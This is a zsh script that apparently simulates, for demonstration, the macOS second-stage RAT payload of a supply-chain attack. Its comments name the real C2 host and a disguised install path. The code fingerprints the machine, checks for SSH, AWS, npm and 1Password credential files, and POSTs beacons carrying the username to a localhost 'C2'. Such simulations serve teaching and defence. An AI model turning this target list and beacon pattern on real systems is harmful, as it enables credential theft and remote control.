#!/bin/zsh
# payloads/macos.sh
#
# DEMO RECONSTRUCTION — macOS second-stage payload simulation
#
# In the real attack, this was an AppleScript that fetched a compiled C++ RAT binary
# from sfrclak.com:8000, saved it to /Library/Caches/com.apple.act.mond,
# made it executable, and launched it in the background.
#
# The C++ RAT then beaconed to the C2 every 60 seconds and supported:
#   - Running additional payloads
#   - Executing arbitrary shell commands
#   - Enumerating the filesystem
#   - Self-termination
#
# This simulation logs what the real RAT would do instead of doing it.

RAT_PATH="/Library/Caches/com.apple.act.mond"
C2_HOST="localhost"
C2_PORT="3000"
BEACON_INTERVAL=60

log() {
  echo "[macOS RAT] $(date -u +%Y-%m-%dT%H:%M:%SZ) $1"
}

# ── PHASE 1: Simulate system fingerprinting ───────────────────────────────────
log "Fingerprinting system..."
log "  hostname:  $(hostname)"
log "  user:      $(whoami)"
log "  os:        $(sw_vers -productVersion 2>/dev/null || echo 'unknown')"
log "  arch:      $(uname -m)"

# ── PHASE 2: Simulate credential harvesting ───────────────────────────────────
# Real RAT would enumerate these paths and exfiltrate contents
TARGETS=(
  "$HOME/.ssh"
  "$HOME/.aws/credentials"
  "$HOME/.npmrc"
  "$HOME/.gitconfig"
  "$HOME/Library/Application Support/1Password"
)

log "Enumerating high-value paths..."
for target in "${TARGETS[@]}"; do
  if [ -e "$target" ]; then
    log "  [FOUND] $target — would exfiltrate"
  else
    log "  [NOT FOUND] $target"
  fi
done

# ── PHASE 3: Simulate C2 beacon loop ─────────────────────────────────────────
log "Starting beacon loop (every ${BEACON_INTERVAL}s) → ${C2_HOST}:${C2_PORT}/beacon"

for i in 1 2 3; do
  log "Beacon #${i} → POST http://${C2_HOST}:${C2_PORT}/beacon"
  curl -s -X POST \
    -H "Content-Type: application/json" \
    -d "{\"os\":\"macOS\",\"user\":\"$(whoami)\",\"beacon\":${i}}" \
    "http://${C2_HOST}:${C2_PORT}/beacon" 2>/dev/null \
    && log "Beacon #${i} acknowledged" \
    || log "Beacon #${i} failed (C2 unreachable)"
  sleep $BEACON_INTERVAL
done

log "Demo complete. In a real attack this loop would run indefinitely until RAT is terminated."
